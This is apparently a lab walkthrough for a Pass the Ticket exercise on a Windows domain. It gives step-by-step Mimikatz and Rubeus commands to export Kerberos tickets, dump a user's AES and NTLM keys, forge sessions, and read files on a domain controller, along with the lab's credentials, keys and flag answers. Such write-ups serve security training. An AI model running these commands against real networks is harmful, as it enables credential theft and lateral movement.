# Pass the Ticket (PtT) from Windows

RDP to 10.129.3.125 with user "`Administrator`" and password "`AnotherC0mpl3xP4$$`"

## Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?

```bash
#Mimikatz
cd C:\tools
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit
dir *.kirbi
```

OR

Rubeus - Export Tickets

```bash
Rubeus.exe dump /nowrap
```

3

## Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \DC01.inlanefreight.htb\john

### Mimikatz Route

{% code overflow="wrap" %}
```bash
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```
{% endcode %}

john ekeys

```
Authentication Id : 0 ; 408153 (00000000:00063a59)
Session           : Service from 0
User Name         : john
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 2/20/2024 8:33:48 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1108

         * Username : john
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
         * Key List :
           aes256_hmac       9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
           rc4_hmac_nt       c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_hmac_old      c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_md4           c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_hmac_nt_exp   c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_hmac_old_exp  c4b0e1b10c7ce2c4723b4e2407ef81a2
```

Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using `Mimikatz` and `Rubeus`.

```bash
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:john /ntlm:c4b0e1b10c7ce2c4723b4e2407ef81a2
dir \\DC01.inlanefreight.htb\john
type \\DC01.inlanefreight.htb\john\john.txt
Learn1ng_M0r3_Tr1cks_with_J0hn
```

### Rubeus Route

```bash
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:john /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /nowrap
```

result

```
ServiceName              :  krbtgt/inlanefreight.htb
  ServiceRealm             :  INLANEFREIGHT.HTB
  UserName                 :  john
  UserRealm                :  INLANEFREIGHT.HTB
  StartTime                :  2/20/2024 9:23:02 AM
  EndTime                  :  2/20/2024 7:23:02 PM
  RenewTill                :  2/27/2024 9:23:02 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  OjG9O3waQlOnUC8h+asGslAgoQhqTN3FsqVfbC+7S8Y=
  ASREP (key)              :  9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC
```

With `Rubeus` we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.

```bash
Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt
dir \\DC01.inlanefreight.htb\john
```

Another way is to import the ticket into the current session using the `.kirbi` file from the disk. Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.

```bash
#Rubeus - Pass the Ticket
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
dir \\DC01.inlanefreight.htb\john
```

<pre class="language-bash"><code class="lang-bash"><strong>#Mimikatz - Pass the Ticket
</strong>mimikatz.exe 
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
exit
dir \\DC01.inlanefreight.htb\john
</code></pre>

## Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt

```bash
#Mimikatz
privilege::debug
kerberos::ptt "C:\tools\[0;7c112]-2-0-60a10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
powershell
Enter-PSSession -ComputerName DC01
type C:\john\john.txt
P4$$_th3_Tick3T_PSR
```

```bash
#Rubeus
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
powershell
Enter-PSSession -ComputerName DC01
type C:\john\john.txt
P4$$_th3_Tick3T_PSR
```
